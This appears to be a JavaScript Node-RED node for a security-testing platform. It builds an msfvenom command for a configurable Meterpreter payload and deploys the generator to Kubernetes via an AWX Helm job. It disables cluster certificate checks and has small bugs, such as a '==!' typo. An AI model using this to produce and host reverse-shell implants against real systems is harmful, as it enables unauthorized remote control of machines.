const awxConnector  = require("./awx-connector.js")

module.exports = function(RED) {
    function MetasploitCreateMeterpreter(config) {
        try {          
            RED.nodes.createNode(this, config);
            this.helmChart = "msfvenom";
            this.clusterService = RED.nodes.getNode(config.clusterService);
            this.awxService = RED.nodes.getNode(config.awxService);
            this.jobTimeout;
            this.helmReleaseName = config.helmReleaseName;
            this.metasploitServiceName = config.metasploitServiceName;
            this.metasploitPayload = config.metasploitPayload;
            this.metasploitLHOST = config.metasploitLHOST;
            this.metasploitOutput = config.metasploitOutput;
            this.metasploitLPORT = Number(config.metasploitLPORT);
            this.clusterName = "cluster.local";

            if(this.clusterService.clusterName) {
                if (this.clusterService.clusterName.length ==! 0) {
                    this.clusterName = this.clusterService.clusterName
                }
            }

            try {
                this.jobTimeout = parseInt(config.jobTimeout);
            } catch (err){
                throw new Error("Job timed out.")
            }

            var timings = {
                //in seconds
                initialWait: 2,
                interval: 10,
                timeout: this.jobTimeout
            }

            const node = this;

            node.on('input', async function(msg) {
                const regexKubernetesName =  /(?=^.{0,23}$)^[a-z]([-a-z0-9]*[a-z0-9])$/g;
                const regexPort = /^()([1-9]|[1-5]?[0-9]{2,4}|6[1-4][0-9]{3}|65[1-4][0-9]{2}|655[1-2][0-9]|6553[1-5])$/
                try {

                    // error check: helm name
                    if (!new RegExp(regexKubernetesName).test(this.helmReleaseName)) {
                        throw 'Helm Release Name: Invalid name!';
                    }

                    if (!new RegExp(regexPort).test(this.metasploitLPORT)) {
                        throw 'LPORT: Invalid port!';
                    }

                    // build msfvenom command
                    const command = "-p " + this.metasploitPayload + " OverrideRequestHost=true" +
                        " OverrideLHOST=" + this.metasploitLHOST + " OverrideLPORT=" + this.metasploitLPORT +
                        " -f " + this.metasploitOutput

                    var helm_values = {
                        serviceName: this.metasploitServiceName,
                        msfvenom: {
                            command: command,
                        }
                    }
                    let extraVars = {
                        limit: "localhost",
                        extra_vars: {
                            kube_api_token: this.clusterService.credentials.token,
                            kube_api_url: this.clusterService.kubeApiUrl,
                            helm_release_name: this.helmReleaseName,
                            helm_chart: this.helmChart,
                            helm_repo_url: this.clusterService.helmRepoUrl,
                            kube_namespace: this.clusterService.kubeNamespace,
                            helm_values: JSON.stringify(helm_values),
                            wait: "yes",
                            atomic: "yes",
                            kube_verify_cert: "no",
                            validate_certs: this.clusterService.rejectUnauthorized
                        }
                    };

                    awxConnector.init(this.awxService.url, this.awxService.credentials.token);
                    node.status({fill: "blue", shape: "ring", text: `Job pending`});

                    const jobResponse = await awxConnector.executeJob("Helm Install", 'localhost', extraVars, timings);
                    const allSuccess = jobResponse.jobSuccess;
                    const jobs = jobResponse.jobSummaryResults;
                    const stdout = jobResponse.stdout;

                    let msgStdoutResponse = {payload: stdout};
                    let allSuccessResponse, failedResponse;
                    msg.jobresult = jobs;
                    msg.helmReleaseName = this.helmReleaseName;

                    if (!allSuccess) {
                        node.status({fill: "yellow", shape: "dot", text: `Job finished with errors.`});
                        failedResponse = msg;
                    } else {
                        msg.payload = "http://" +
                            this.metasploitServiceName + "." + this.clusterService.kubeNamespace + ".svc." + this.clusterName +
                            "/meterpreter"
                        allSuccessResponse = msg
                        node.status({fill: "green", shape: "dot", text: `Job finished.`});
                    }
                    node.send([allSuccessResponse, failedResponse, msgStdoutResponse])
                } catch (err) {
                    console.log(err)
                    node.status({fill: "red", shape: "dot", text: err});
                    node.error(err)
                }
            });
        } catch (err) {
            console.log(err)
            node.error(err)
        }
    }

    RED.nodes.registerType("Metasploit: Create Meterpreter", MetasploitCreateMeterpreter);
}

